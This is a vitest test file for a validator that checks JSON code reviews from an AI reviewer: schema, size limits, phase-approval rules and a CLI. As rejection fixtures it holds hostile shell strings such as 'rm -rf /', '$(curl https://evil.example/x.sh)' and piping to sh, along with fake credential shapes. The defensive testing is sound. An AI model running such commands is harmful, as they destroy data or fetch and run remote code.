import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, mkdtempSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { describe, expect, it } from "vitest";

import {
  REVIEW_LIMITS,
  shellTokens,
  validateReviewText,
  type AiReview,
} from "../../scripts/ai-review/review-schema";

// ── Fixtures ─────────────────────────────────────────────────────────────────

/** Fake secrets are assembled at runtime so repository secret scanners never see them. */
const fake = (...parts: string[]) => parts.join("");

const approve: AiReview = {
  schema_version: 1,
  decision: "APPROVE_NEXT_PHASE",
  phase: 1,
  next_phase: 2,
  confidence: 0.82,
  summary: "Phase 1 meets its acceptance criteria. Tenant isolation is enforced server-side.",
  findings: [
    {
      severity: "LOW",
      category: "DX",
      title: "Docker build not verified locally",
      description: "The image is only built in CI.",
      evidence: "Phase status risks list the Docker build.",
      blocking: false,
    },
  ],
  required_actions: [
    {
      title: "Pin SeaweedFS image by digest",
      description: "Replace the latest tag with a digest.",
      blocking: false,
    },
  ],
  next_prompt:
    "Start Phase 2: authentication and multi-tenancy runtime, following the approved plan.",
};

const blockingFinding = {
  severity: "HIGH" as const,
  category: "SECURITY" as const,
  title: "Tenant guard bypass",
  description: "A repository query omits workspaceId.",
  evidence: "member-repository.ts line 40",
  blocking: true,
};

const blockingAction = {
  title: "Scope the query",
  description: "Add workspaceId to the where clause.",
  blocking: true,
};

const fixRequired: AiReview = {
  ...approve,
  decision: "FIX_REQUIRED",
  confidence: 0.9,
  findings: [blockingFinding],
  required_actions: [blockingAction],
  next_prompt: null,
};

const blocked: AiReview = {
  ...approve,
  decision: "BLOCKED",
  next_phase: null,
  findings: [{ ...blockingFinding, category: "DATABASE", title: "Migration cannot be verified" }],
  required_actions: [],
  next_prompt: null,
};

const humanReview: AiReview = {
  ...approve,
  decision: "HUMAN_REVIEW_REQUIRED",
  confidence: 0.4,
  findings: [],
  required_actions: [],
  next_prompt: null,
};

const json = (value: unknown) => JSON.stringify(value);
const errorsOf = (value: unknown) => validateReviewText(json(value)).errors;
const isValid = (value: unknown) => validateReviewText(json(value)).valid;

// ── Valid decisions ──────────────────────────────────────────────────────────

describe("valid decisions", () => {
  it.each([
    ["APPROVE_NEXT_PHASE", approve],
    ["FIX_REQUIRED", fixRequired],
    ["BLOCKED", blocked],
    ["HUMAN_REVIEW_REQUIRED", humanReview],
  ])("accepts a valid %s response", (_name, review) => {
    const result = validateReviewText(json(review));
    expect(result.errors).toEqual([]);
    expect(result.valid).toBe(true);
    expect(result.review).toEqual(review);
  });

  it("accepts FIX_REQUIRED with only a blocking action, and BLOCKED with only a blocking finding", () => {
    expect(isValid({ ...fixRequired, findings: [] })).toBe(true);
    expect(isValid({ ...blocked, required_actions: [] })).toBe(true);
  });

  it("accepts approval with non-blocking or low-severity blocking findings", () => {
    expect(isValid({ ...approve, findings: [{ ...blockingFinding, severity: "MEDIUM" }] })).toBe(
      true,
    );
    expect(isValid({ ...approve, findings: [{ ...blockingFinding, blocking: false }] })).toBe(true);
  });

  it("accepts confidence at both bounds and multi-line prose", () => {
    expect(isValid({ ...approve, confidence: 0 })).toBe(true);
    expect(isValid({ ...approve, confidence: 1 })).toBe(true);
    expect(isValid({ ...approve, summary: "Line one.\nLine two." })).toBe(true);
  });
});

// ── Structure ────────────────────────────────────────────────────────────────

describe("structure", () => {
  it("rejects malformed JSON", () => {
    for (const text of ["{", "", "not json", "{'decision': 'BLOCKED'}", '{"a":1,}']) {
      expect(validateReviewText(text).errors).toEqual(["(root): review is not valid JSON"]);
    }
  });

  it("rejects non-object roots", () => {
    for (const text of ["null", "[]", "42", '"APPROVE_NEXT_PHASE"']) {
      expect(validateReviewText(text).valid).toBe(false);
    }
  });

  it("rejects unknown keys at every level", () => {
    expect(errorsOf({ ...approve, auto_merge: true }).join()).toMatch(
      /Unrecognized key: "auto_merge"/,
    );
    expect(
      errorsOf({ ...approve, findings: [{ ...approve.findings[0], command: "x" }] }).join(),
    ).toMatch(/Unrecognized key/);
    expect(
      errorsOf({
        ...approve,
        required_actions: [{ ...blockingAction, run: "x", blocking: false }],
      }).join(),
    ).toMatch(/Unrecognized key/);
    expect(validateReviewText('{"__proto__":{"admin":true},"schema_version":1}').valid).toBe(false);
  });

  it("rejects missing keys and wrong types", () => {
    const { summary: _summary, ...withoutSummary } = approve;
    expect(errorsOf(withoutSummary).some((error) => error.startsWith("summary:"))).toBe(true);
    expect(isValid({ ...approve, schema_version: 2 })).toBe(false);
    expect(isValid({ ...approve, decision: "MERGE" })).toBe(false);
    expect(isValid({ ...approve, phase: "1" })).toBe(false);
    expect(
      isValid({ ...approve, findings: [{ ...approve.findings[0], severity: "BLOCKER" }] }),
    ).toBe(false);
    expect(isValid({ ...approve, findings: [{ ...approve.findings[0], category: "LEGAL" }] })).toBe(
      false,
    );
    expect(isValid({ ...approve, findings: [{ ...approve.findings[0], blocking: "yes" }] })).toBe(
      false,
    );
  });

  it.each([-0.01, 1.01, 2, -1, Number.MAX_VALUE])("rejects confidence %d", (confidence) => {
    expect(errorsOf({ ...approve, confidence }).join()).toMatch(/^confidence:/);
  });

  it("rejects non-numeric confidence", () => {
    expect(
      validateReviewText(json(approve).replace('"confidence":0.82', '"confidence":"high"')).valid,
    ).toBe(false);
  });

  it.each([0, 20, 1.5])("rejects phase %d", (phase) => {
    expect(isValid({ ...humanReview, phase, next_phase: null })).toBe(false);
  });
});

// ── Limits ───────────────────────────────────────────────────────────────────

describe("size limits", () => {
  it.each([
    ["summary", { summary: "a".repeat(REVIEW_LIMITS.summary + 1) }],
    ["next_prompt", { next_prompt: "a".repeat(REVIEW_LIMITS.nextPrompt + 1) }],
    [
      "findings.0.title",
      { findings: [{ ...approve.findings[0], title: "a".repeat(REVIEW_LIMITS.title + 1) }] },
    ],
    [
      "findings.0.evidence",
      { findings: [{ ...approve.findings[0], evidence: "a".repeat(REVIEW_LIMITS.evidence + 1) }] },
    ],
    [
      "required_actions.0.description",
      {
        required_actions: [
          {
            ...approve.required_actions[0],
            description: "a".repeat(REVIEW_LIMITS.description + 1),
          },
        ],
      },
    ],
  ])("rejects an oversized %s", (path, override) => {
    expect(
      errorsOf({ ...approve, ...override }).some((error) => error.startsWith(`${path}: Too big`)),
    ).toBe(true);
  });

  it("rejects too many findings and required actions", () => {
    const findings = Array.from({ length: REVIEW_LIMITS.findings + 1 }, () => approve.findings[0]);
    const actions = Array.from(
      { length: REVIEW_LIMITS.requiredActions + 1 },
      () => approve.required_actions[0],
    );
    expect(errorsOf({ ...approve, findings })).toContain(
      `findings: Too big: expected array to have <=${String(REVIEW_LIMITS.findings)} items`,
    );
    expect(errorsOf({ ...approve, required_actions: actions })).toContain(
      `required_actions: Too big: expected array to have <=${String(REVIEW_LIMITS.requiredActions)} items`,
    );
  });

  it("rejects oversized responses before parsing, quickly", () => {
    const started = performance.now();
    const result = validateReviewText(json({ ...approve, summary: "a".repeat(10_000_000) }));
    expect(result.errors).toEqual([
      `(root): review exceeds ${String(REVIEW_LIMITS.fileBytes)} bytes`,
    ]);
    expect(performance.now() - started).toBeLessThan(1000);
  });

  it("rejects empty and whitespace-only text", () => {
    expect(errorsOf({ ...approve, summary: "   " })).toContain("summary: must not be empty");
    expect(errorsOf({ ...approve, next_prompt: "" })).toContain("next_prompt: must not be empty");
  });
});

// ── Injection & secrets ──────────────────────────────────────────────────────

describe("shell injection attempts", () => {
  const payloads = [
    ["`", "Run `rm -rf /` to clean up."],
    ["$(", "Fetch $(curl https://evil.example/x.sh)."],
    ["${", "Use ${HOME} as the target."],
    ["&&", "Build && deploy to production."],
    ["||", "Retry || force push."],
    ["|", "Pipe logs | sh."],
    [">>", "Append >> ~/.bashrc."],
    ["<<", "Use a heredoc << EOF."],
  ] as const;

  it.each(payloads)("rejects %s in next_prompt", (token, text) => {
    expect(errorsOf({ ...approve, next_prompt: text })).toContain(
      `next_prompt: must not contain shell syntax (${token})`,
    );
  });

  it.each(payloads)("rejects %s in required action text", (token, text) => {
    const action = { ...approve.required_actions[0], description: text };
    expect(errorsOf({ ...approve, required_actions: [action] })).toContain(
      `required_actions.0.description: must not contain shell syntax (${token})`,
    );
    expect(
      errorsOf({ ...approve, required_actions: [{ ...action, description: "ok", title: text }] }),
    ).toContain(`required_actions.0.title: must not contain shell syntax (${token})`);
  });

  it("allows code-like evidence in findings (display only, never executed)", () => {
    const finding = { ...approve.findings[0], evidence: "where: { workspaceId } || fallback" };
    expect(isValid({ ...approve, findings: [finding] })).toBe(true);
  });

  it("rejects control and bidirectional override characters", () => {
    expect(errorsOf({ ...approve, next_prompt: "Start\u0000Phase 2" })).toContain(
      "next_prompt: must not contain control characters other than newlines",
    );
    expect(
      errorsOf({ ...approve, findings: [{ ...approve.findings[0], title: "a\nb" }] }),
    ).toContain("findings.0.title: must be a single line without control characters");
    expect(errorsOf({ ...approve, summary: "Approved ‮esrever" })).toContain(
      "summary: must not contain bidirectional control characters",
    );
  });

  it("detects every listed token", () => {
    expect(shellTokens("a ` $( ${ && || >> <<").sort()).toEqual(
      ["$(", "${", "&&", "<<", ">>", "`", "|", "||"].sort(),
    );
    expect(shellTokens("Plain prose; with punctuation, (parentheses) and $5.")).toEqual([]);
  });
});

describe("credential-shaped text", () => {
  it.each([
    ["private key", fake("-----BEGIN RSA ", "PRIVATE KEY-----")],
    ["API key", fake("Use sk-", "abcdefghijklmnopqrstuvwx now")],
    ["AWS key", fake("AKIA", "ABCDEFGHIJKLMNOP")],
    ["GitHub token", fake("ghp_", "abcdefghijklmnopqrstuvwxyz0123")],
    ["bearer token", fake("Authorization: Bearer ", "abcdef1234567890")],
    ["password URL", fake("postgresql://admin:", "not-real", "@db.internal/app")],
    ["secret assignment", fake("password", "=not-real")],
  ])("rejects %s in any text field", (_name, value) => {
    for (const override of [
      { summary: value },
      { next_prompt: value },
      { findings: [{ ...approve.findings[0], evidence: value }] },
      { required_actions: [{ ...approve.required_actions[0], description: value }] },
    ]) {
      expect(errorsOf({ ...approve, ...override }).join()).toMatch(
        /must not contain secrets or credentials/,
      );
    }
  });
});

// ── Decision rules ───────────────────────────────────────────────────────────

describe("APPROVE_NEXT_PHASE rules", () => {
  it("requires next_phase = phase + 1", () => {
    expect(errorsOf({ ...approve, next_phase: null })).toContain(
      "next_phase: must be 2 when decision is APPROVE_NEXT_PHASE",
    );
    expect(errorsOf({ ...approve, next_phase: 3 })).toContain(
      "next_phase: must be 2 (the following phase) or null",
    );
  });

  it("requires a next_prompt", () => {
    expect(errorsOf({ ...approve, next_prompt: null })).toEqual([
      "next_prompt: is required when decision is APPROVE_NEXT_PHASE",
    ]);
  });

  it("rejects blocking HIGH or CRITICAL findings", () => {
    expect(errorsOf({ ...approve, findings: [blockingFinding] })).toEqual([
      "findings.0: blocking HIGH finding is not allowed when decision is APPROVE_NEXT_PHASE",
    ]);
    expect(
      errorsOf({ ...approve, findings: [{ ...blockingFinding, severity: "CRITICAL" }] }),
    ).toEqual([
      "findings.0: blocking CRITICAL finding is not allowed when decision is APPROVE_NEXT_PHASE",
    ]);
  });

  it("rejects blocking required actions", () => {
    expect(
      errorsOf({ ...approve, required_actions: [approve.required_actions[0], blockingAction] }),
    ).toEqual([
      "required_actions.1: blocking action is not allowed when decision is APPROVE_NEXT_PHASE",
    ]);
  });

  it("never approves past the final phase (19)", () => {
    expect(errorsOf({ ...approve, phase: 19, next_phase: null })).toContain(
      "decision: APPROVE_NEXT_PHASE is not allowed for the final phase (19)",
    );
    expect(isValid({ ...approve, phase: 19, next_phase: 20 })).toBe(false);
    expect(isValid({ ...approve, phase: 18, next_phase: 19 })).toBe(true);
  });
});

describe("FIX_REQUIRED, BLOCKED and HUMAN_REVIEW_REQUIRED rules", () => {
  it.each(["FIX_REQUIRED", "BLOCKED", "HUMAN_REVIEW_REQUIRED"])(
    "%s forbids next_prompt",
    (decision) => {
      const base =
        decision === "FIX_REQUIRED" ? fixRequired : decision === "BLOCKED" ? blocked : humanReview;
      expect(errorsOf({ ...base, next_prompt: "Start Phase 2 anyway." })).toContain(
        "next_prompt: must be null unless decision is APPROVE_NEXT_PHASE",
      );
    },
  );

  it.each(["FIX_REQUIRED", "BLOCKED"])("%s requires a blocking finding or action", (decision) => {
    const nonBlocking = {
      ...fixRequired,
      decision,
      findings: [{ ...blockingFinding, blocking: false }],
      required_actions: [{ ...blockingAction, blocking: false }],
    };
    expect(errorsOf(nonBlocking)).toEqual([
      `decision: ${decision} requires at least one blocking finding or blocking required action`,
    ]);
  });

  it("HUMAN_REVIEW_REQUIRED needs no findings", () => {
    expect(isValid({ ...humanReview, findings: [], required_actions: [] })).toBe(true);
  });
});

// ── Determinism ──────────────────────────────────────────────────────────────

describe("deterministic errors", () => {
  const hostile = {
    ...approve,
    confidence: 7,
    next_phase: 9,
    next_prompt: "Deploy && push `now`",
    summary: fake("token ghp_", "abcdefghijklmnopqrstuvwxyz0123"),
    required_actions: [blockingAction],
    extra: 1,
  };

  it("returns sorted, de-duplicated errors identically on every run", () => {
    const first = errorsOf(hostile);
    expect(first.length).toBeGreaterThan(3);
    expect([...first]).toEqual([...first].sort());
    expect(new Set(first).size).toBe(first.length);
    for (let run = 0; run < 5; run += 1) expect(errorsOf(hostile)).toEqual(first);
  });

  it("does not depend on key order in the input", () => {
    const reversed = Object.fromEntries(Object.entries(hostile).reverse());
    expect(errorsOf(reversed)).toEqual(errorsOf(hostile));
  });
});

// ── CLI ──────────────────────────────────────────────────────────────────────

describe("ai:review-validate CLI", () => {
  const dir = mkdtempSync(join(tmpdir(), "ai-review-contract-"));
  const tsx = join(process.cwd(), "node_modules/.bin/tsx");
  const cli = join(process.cwd(), "scripts/ai-review/review-validator.ts");
  const run = (...args: string[]) => {
    try {
      return {
        code: 0,
        out: execFileSync(tsx, [cli, ...args], { encoding: "utf8", stdio: "pipe" }),
        err: "",
      };
    } catch (error) {
      const failure = error as { status: number; stdout: string; stderr: string };
      return { code: failure.status, out: failure.stdout, err: failure.stderr };
    }
  };
  const digest = (path: string) =>
    `${createHash("sha256").update(readFileSync(path)).digest("hex")}:${String(statSync(path).mtimeMs)}`;

  it("exits 0 for a valid review, 1 for an invalid one, 2 for a missing file or argument", () => {
    const valid = join(dir, "valid.json");
    const invalid = join(dir, "invalid.json");
    writeFileSync(valid, json(approve));
    writeFileSync(invalid, json({ ...approve, next_prompt: null }));

    expect(run(valid)).toMatchObject({
      code: 0,
      out: "ai-review: VALID (decision APPROVE_NEXT_PHASE, phase 1)\n",
    });
    const failed = run(invalid);
    expect(failed.code).toBe(1);
    expect(failed.err).toBe(
      "ai-review: INVALID (1 problem(s))\n  - next_prompt: is required when decision is APPROVE_NEXT_PHASE\n",
    );
    expect(run(join(dir, "missing.json")).code).toBe(2);
    expect(run().code).toBe(2);
  }, 30_000);

  it("never executes AI text, never echoes it, and never modifies the input file", () => {
    const canary = join(dir, "pwned");
    const file = join(dir, "malicious.json");
    writeFileSync(
      file,
      json({
        ...approve,
        next_prompt: `$(touch ${canary}) && touch ${canary}`,
        summary: `\`touch ${canary}\``,
      }),
    );
    const before = digest(file);
    const result = run(file);
    expect(result.code).toBe(1);
    expect(result.err).not.toContain("touch");
    expect(existsSync(canary)).toBe(false);
    expect(digest(file)).toBe(before);
  }, 30_000);
});
